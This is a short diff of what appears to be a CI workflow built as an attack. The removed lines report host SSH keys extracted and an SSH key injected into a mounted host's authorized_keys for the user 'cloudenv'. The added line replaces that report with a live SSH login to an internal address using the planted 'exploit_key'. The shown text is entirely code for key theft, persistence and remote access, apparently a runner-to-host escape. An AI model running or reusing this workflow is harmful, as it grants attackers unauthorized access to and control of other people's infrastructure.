@@ -52,8 +52,4 @@ jobs:
           echo "Private key ready at /tmp/exploit_key"
       
       - name: Display results
-        run: |
-          echo "=== Exploit Summary ==="
-          echo "Host keys extracted: $(ls -1 /tmp/host_* 2>/dev/null | wc -l)"
-          echo "SSH key injected: $(sudo test -f /mnt/host2/home/cloudenv/.ssh/authorized_keys && echo 'Yes' || echo 'No')"
-          echo "Next step: ssh -i /tmp/exploit_key -p 2000 cloudenv@<HOST_IP>"
+        run: ssh -i /tmp/exploit_key -p 2000 cloudenv@10.1.0.230
